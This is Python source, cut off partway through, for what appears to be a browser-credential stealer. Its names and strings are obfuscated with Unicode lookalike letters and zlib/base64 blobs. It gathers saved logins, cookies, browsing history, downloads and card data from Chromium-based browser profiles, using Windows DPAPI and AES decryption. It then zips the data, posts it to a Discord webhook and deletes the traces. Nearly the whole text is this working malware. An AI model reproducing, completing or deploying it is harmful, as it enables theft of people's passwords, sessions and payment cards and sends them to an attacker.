import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData
__𝙇𝗢𝗚𝙄𝘕𝘚__ = []
__𝘊𝗢𝘖𝗞𝙄𝗘𝘚__ = []
__𝘞𝙀𝘽_𝙃𝙄𝗦𝙏𝗢𝗥𝙔__ = []
__𝘋𝙊𝘞𝙉𝘓𝗢𝗔𝘋𝙎__ = []
__𝗖𝘼𝙍𝘿𝙎__ = []

class Browsers:

    def __init__(self, webhook):
        𝙨𝘦𝘵𝙖𝙩𝘵𝘳(𝘴𝗲𝗹𝙛, 'webhook', 𝗦𝘺𝘯𝙘𝘞𝗲𝗯𝙝𝙤𝙤𝘬.from_url(𝘸𝙚𝘣𝙝𝙤𝗼𝘬))
        𝘾𝗵𝙧𝘰𝘮𝗶𝘂𝘮()
        𝗢𝙥𝘦𝘳𝗮()
        𝘜𝘱𝗹𝘰𝗮𝗱(𝘴𝗲𝘭𝙛.webhook)

class Upload:

    def __init__(self, webhook):
        𝘴𝗲𝙩𝘢𝙩𝘁𝗿(𝙨𝗲𝘭𝗳, 'webhook', 𝙬𝗲𝗯𝘩𝗼𝙤𝘬)
        𝘴𝘦𝗹𝗳.write_files()
        𝘀𝗲𝘭𝙛.send()
        𝘀𝗲𝗹𝘧.clean()

    def write_files(self):
        𝙤𝙨.makedirs(__𝘪𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode(), exist_ok=True)
        if __𝗟𝙊𝙂𝗜𝘕𝘚__:
            with 𝘰𝗽𝙚𝗻(__𝙞𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JNr\xb7\xccK\x0c7\xad\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00c\xa1\x07\xbe')).decode(), __𝗶𝗺𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝗶𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝗳:
                𝘧.write(__𝙞𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘀𝘁𝘳(𝙭) for 𝘹 in __𝙇𝘖𝙂𝘐𝙉𝘚__)))
        if __𝘊𝗢𝙊𝗞𝗜𝗘𝘚__:
            with 𝙤𝗽𝗲𝘯(__𝘪𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8e4\xb2,K4\xca\xc9I\xae45H\xf5\x08\xb4\x05\x00b\xd3\x07\xc9')).decode(), __𝗶𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝗺𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝘧:
                𝗳.write(__𝙞𝗺𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘴𝘁𝙧(𝙭) for 𝘹 in __𝘾𝗢𝘖𝗞𝗜𝙀𝘚__)))
        if __𝗪𝙀𝘽_𝗛𝘐𝗦𝗧𝘖𝘙𝘠__:
            with 𝗼𝗽𝗲𝗻(__𝗶𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JN1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcb.M\xf1\xc80\x00\x00\x8a\x18\t\xb2')).decode(), __𝗶𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝙞𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝘧:
                𝘧.write(__𝘪𝘮𝘱𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘀𝘁𝘳(𝘅) for 𝘹 in __𝘞𝘌𝘉_𝘏𝙄𝙎𝗧𝗢𝘙𝙔__)))
        if __𝗗𝘖𝘞𝗡𝙇𝙊𝘼𝘿𝘚__:
            with 𝘰𝘱𝙚𝘯(__𝙞𝙢𝙥𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8er\xb74N\xca\xad(\x8b\x0c\x0f\xaa\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00\x88\xc9\tM')).decode(), __𝗶𝗺𝗽𝗼𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝙞𝗺𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝗳:
                𝗳.write(__𝙞𝗺𝘱𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘀𝙩𝘳(𝘹) for 𝘅 in __𝘿𝗢𝘞𝙉𝙇𝘖𝘼𝘿𝘚__)))
        if __𝘊𝗔𝘙𝘿𝙎__:
            with 𝘰𝗽𝗲𝙣(__𝗶𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8e4r\xab\x8c\xf2\xf0-M\xf1\xc80\x00\x00E\x99\x06\x9a')).decode(), __𝗶𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝗳:
                𝙛.write(__𝗶𝙢𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘴𝘁𝘳(𝘹) for 𝘅 in __𝗖𝘼𝘙𝘿𝙎__)))
        with 𝘡𝙞𝘱𝗙𝗶𝗹𝗲(__𝙞𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode(), __𝘪𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝘇𝘪𝗽:
            for 𝗳𝙞𝙡𝗲 in 𝙤𝙨.listdir(__𝘪𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode()):
                𝘇𝘪𝗽.write(__𝗶𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JN56\xb0\x05\x00\x19\x8d\x03\xad')).decode().format(𝙛𝙞𝘭𝘦), 𝗳𝗶𝙡𝙚)

    def send(self):
        𝙨𝘦𝗹𝗳.webhook.send(embed=𝘌𝘮𝙗𝙚𝗱(title=__𝘪𝘮𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x0b\xcbu3L\xf2\x08\xb4\x05\x00\x0b\x8b\x02s')).decode(), description=__𝙞𝙢𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8btwJ\x07\x00\x03(\x01J')).decode() + __𝗶𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join(𝘀𝘦𝘭𝗳.tree(𝗣𝗮𝘁𝗵(__𝘪𝗺𝗽𝗼𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode()))) + __𝙞𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8btwJ\x07\x00\x03(\x01J')).decode()), file=𝗙𝘪𝗹𝗲(__𝘪𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode()))

    def clean(self):
        𝘴𝙝𝙪𝙩𝙞𝘭.rmtree(__𝙞𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode())
        𝗼𝙨.remove(__𝘪𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode())

    def tree(self, path, prefix=__𝘪𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode(), midfix_folder=__𝙞𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xb3\xf0\xd2\x0eI\xcft,\xf1t\xb4\xb5\x05\x00\x16\xfb\x03\x8b')).decode(), midfix_file=__𝙞𝗺𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xb3\xf0\xd2\x0e\xc9pv,\xf1t\xb4\xb5\x05\x00\x15\xf9\x03f')).decode()):
        𝗽𝘪𝗽𝗲𝘴 = {__𝙞𝗺𝘱𝙤𝙧𝘁__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK6v\xca\x884\n\xb5\x05\x00\n\xfa\x02^')).decode(): __𝘪𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3tvL\xf7t\xb4\xb5\x05\x00\nL\x029')).decode(), __𝘪𝘮𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xca\xf5\xcb\x07\x00\rp\x03\x06')).decode(): __𝙞𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda3)\x08v\xf6tvL\x07\x00\n\xcf\x02o')).decode(), __𝗶𝙢𝗽𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode(): __𝘪𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda3)\x08N6)\x08v\x04aOG[[\x00*\xbd\x04\xcf')).decode(), __𝘪𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKrw\xabJq\xb4\xb5\x05\x00\x0c\x19\x02\x89')).decode(): __𝙞𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda3)\x08\x0e5)\x08v\x04aOG[[\x00*\x07\x04\xc1')).decode()}
        if 𝘱𝙧𝘦𝙛𝙞𝙭 == __𝙞𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            yield (𝗺𝘪𝙙𝘧𝘪𝘅_𝘧𝗼𝙡𝗱𝘦𝘳 + 𝘱𝙖𝘁𝗵.name)
        𝘤𝗼𝗻𝙩𝘦𝘯𝙩𝘴 = 𝙡𝙞𝙨𝘁(𝘱𝗮𝘵𝙝.iterdir())
        𝗽𝙤𝙞𝙣𝘁𝙚𝙧𝘴 = [𝘱𝘪𝙥𝗲𝘴[__𝙞𝘮𝙥𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode()]] * (𝙡𝗲𝘯(𝘤𝙤𝙣𝙩𝗲𝘯𝘵𝘀) - 𝘪𝘯𝘁.from_bytes(𝘮𝗮𝗽(lambda O, i: 474 - (𝘪𝙣𝘁(𝗢) + 𝘪), 𝙢𝘢𝘱(__𝙞𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝙞𝘵𝙚𝙧(__𝘪𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3sI\xae\x02\x00\x03H\x01p')).decode())] * 3)), 𝗿𝘢𝘯𝘨𝙚(1)), __𝗶𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + [𝗽𝘪𝙥𝙚𝘴[__𝘪𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKrw\xabJq\xb4\xb5\x05\x00\x0c\x19\x02\x89')).decode()]]
        for (𝙥𝙤𝙞𝘯𝘵𝗲𝗿, 𝘱𝗮𝘵𝙝) in 𝙯𝙞𝘱(𝙥𝘰𝙞𝙣𝙩𝗲𝙧𝘀, 𝙘𝙤𝙣𝘵𝘦𝗻𝘵𝙨):
            if 𝗽𝙖𝘵𝙝.is_dir():
                yield __𝗶𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK564O\x8b(\xb1L56H\xf7\xf6(\xb1\xf4t\x8f*Hr\x0f\xab\xf2qv2\xf7\xcf4\xa9\x8c\xca3HO4\xf2,\x00\x00\x008\x0c\xc6')).decode().format(𝗽𝗿𝘦𝗳𝗶𝘅, 𝗽𝘰𝗶𝙣𝘵𝗲𝘳, 𝙢𝘪𝙙𝗳𝗶𝘹_𝗳𝘰𝙡𝗱𝗲𝙧, 𝘱𝗮𝘁𝘩.name, 𝗹𝙚𝘯(𝗹𝙞𝘀𝙩(𝙥𝙖𝘵𝙝.glob(__𝗶𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xce\xcc/\xf3N\xb7\xb5\x05\x00\r?\x02\xc6')).decode()))), 𝘴𝙪𝘮((𝘧.stat().st_size for 𝘧 in 𝘱𝘢𝙩𝗵.glob(__𝗶𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xce\xcc/\xf3N\xb7\xb5\x05\x00\r?\x02\xc6')).decode()) if 𝘧.is_file())) / 𝗶𝘯𝘵.from_bytes(𝙢𝗮𝘱(lambda O, i: 767 - (𝘪𝗻𝘵(𝙊) + 𝗶), 𝗺𝘢𝘱(__𝙞𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝗶𝘁𝙚𝙧(__𝙞𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xab\x8a4\xf6\xab\x8a\xac\x04\x00\x0c\xb4\x02\xef')).decode())] * 3)), 𝙧𝗮𝙣𝘨𝗲(2)), __𝘪𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
                𝗲𝘅𝘵𝘦𝗻𝘀𝙞𝘰𝗻 = 𝙥𝘪𝘱𝘦𝘴[__𝘪𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xca\xf5\xcb\x07\x00\rp\x03\x06')).decode()] if 𝗽𝘰𝙞𝘯𝙩𝗲𝗿 == 𝗽𝗶𝙥𝙚𝙨[__𝗶𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode()] else 𝙥𝗶𝗽𝙚𝘴[__𝗶𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK6v\xca\x884\n\xb5\x05\x00\n\xfa\x02^')).decode()]
                yield from 𝘴𝗲𝘭𝙛.tree(𝙥𝙖𝘵𝗵, prefix=𝗽𝘳𝗲𝗳𝘪𝘹 + 𝙚𝘅𝘵𝗲𝗻𝘴𝘪𝙤𝘯)
            else:
                yield __𝗶𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK564O\x8b(\xb1L56H\xf7\xf6(6\xf3\xc9\xf2\xcaM\x0bv*\x8a\xcc\xcc\xb6\x05\x00~\x97\t\x1b')).decode().format(𝙥𝗿𝘦𝘧𝘪𝙭, 𝗽𝗼𝙞𝙣𝙩𝙚𝗿, 𝙢𝙞𝘥𝙛𝗶𝘅_𝗳𝙞𝘭𝙚, 𝗽𝙖𝘵𝘩.name, 𝗽𝙖𝙩𝗵.stat().st_size / 𝘪𝙣𝙩.from_bytes(𝘮𝘢𝗽(lambda O, i: 799 - (𝗶𝙣𝘵(𝗢) + 𝙞), 𝗺𝗮𝗽(__𝘪𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝙞𝙩𝘦𝗿(__𝙞𝙢𝙥𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xab\xca6\xf5\xab\xca6\x00\x00\r\x05\x02\xcc')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝘦(2)), __𝗶𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))

class Chromium:

    def __init__(self):
        𝙨𝙚𝙩𝗮𝘵𝘁𝙧(𝙨𝘦𝗹𝗳, 'appdata', 𝙤𝙨.getenv(__𝙞𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x0bq\xb5t\t\x0c\xadp\nusr\r\x0c\x0br\x02\x00)\x05\x04\xd4')).decode()))
        𝙨𝗲𝘁𝙖𝘁𝘁𝘳(𝘴𝙚𝙡𝗳, 'browsers', {__𝘪𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x8b\x0c7,\x882\xb2\xb0\x05\x00\x0b2\x02S')).decode(): 𝘀𝙚𝗹𝙛.appdata + __𝗶𝙢𝗽𝗼𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8bpu+I\x0cO)\x8bp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00h\x16\x07\xed')).decode(), __𝘪𝙢𝙥𝘰𝗿𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKq\xb7\xac\x8c4J\xb7\x05\x00\x0b\xd1\x02\x8d')).decode(): 𝘴𝗲𝗹𝗳.appdata + __𝗶𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\x0b*K\xce\xf5\xcb\x8fp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00i&\x07\xf7')).decode(), __𝗶𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝗺𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaK4\xb2,\x89\x8a\x08\xca\x00\x00\x0b\x84\x02\xad')).decode(): 𝘴𝘦𝗹𝘧.appdata + __𝗶𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x8bp-)K\n\x0f3\x88\x0c\xab\x08K6\n\xab\xf4t\r\xcaHqw\xb5\x05\x00h\xc4\x08\x1d')).decode(), __𝙞𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaK2\xf6\xcaL\x8c\x082L\n\xb4\xb5\x05\x00\x18\xed\x03\xb2')).decode(): 𝙨𝙚𝘭𝘧.appdata + __𝙞𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b"x\xda\x8bp\xb5\xac\x8c\xcc\xcd1H\t7L\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00e;\x08'")).decode(), __𝗶𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8b4\n+Mq6\xccL\xce\xb54N6\n\xab\x04\x00,\x0e\x058')).decode(): 𝘴𝙚𝗹𝘧.appdata + __𝘪𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\xf5\xcbI\xca\x0brN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xb0\xd7\n`')).decode(), __𝗶𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf33\xf63\x88\x8c\xf0\xb4\x05\x00\t\xdc\x027')).decode(): 𝘴𝗲𝗹𝘧.appdata + __𝙞𝘮𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8bpI\tIqw\xab\x8c\x80\xd1naUQ\x11\x9e\xe9A\xeen\x06\x91\x81\xb6\xb6\x00\xb2\xf0\n\x80')).decode(), __𝘪𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK6v2Lq7-H,\xb7\xb5\x05\x00\x17M\x03\xac')).decode(): 𝘴𝙚𝘭𝗳.appdata + __𝙞𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8bp\xf3+O\x89\x08*M\x0c/I\x0e5v2Lq7-H4\xac\x08K6\n\xab\xf4t\r\xcaHqw\xb5\x05\x00\xe3\x16\x0b\xfa')).decode(), __𝗶𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\xc9\xcd1\x8a\x0c\xaf\xc8N\x0c\xb4\xb5\x05\x00\x1c\xa3\x04/')).decode(): 𝘴𝗲𝘭𝗳.appdata + __𝘪𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\x8b*H\xc9u+\x8er\xcfI\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00k\xb8\x08\x89')).decode(), __𝙞𝙢𝙥𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x8b2\xb2,\x8b2\xaa\xc8\xf1\t\xf7\xcbO\xce\xb5,\x89\n6\xacJ\xf5\xf0\xb5\x05\x00e5\x08\x18')).decode(): 𝙨𝙚𝗹𝗳.appdata + __𝙞𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8bpM)K2J)\x8e\n\xabpI\xf4\xf0*K\n\x0fM\x0f5\xce\x08\x89p\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\x1e\xf4\rt')).decode(), __𝘪𝙢𝗽𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8b2\xb2,\x8b2\xaa\xc8\xf1\t\xf7\xcbO\xce\xb5,\x89\n\xb4\xb5\x05\x00FC\x06\xae')).decode(): 𝘴𝗲𝙡𝙛.appdata + __𝘪𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8bpM)K2J)\x8e\n\xabpI\xf4\xf0*K\n\x0fK\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00\xbb\xe6\x0bP')).decode(), __𝘪𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝘮𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8b\x8ap*\x88\xac4,O\xce\xcd1\x8a\x0c\xf73\xf5\t\xf7\xaaL2N\xa9\x8a\x8a\xf0\xb4\x05\x00\x8dK\t\x91')).decode(): 𝙨𝗲𝙡𝙛.appdata + __𝙞𝗺𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\r+O\x0c\xf7M\x0f\xf5\xf0*H\xc9u\xcbJ\rvrN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00R\xa7\x0e\x8f')).decode(), 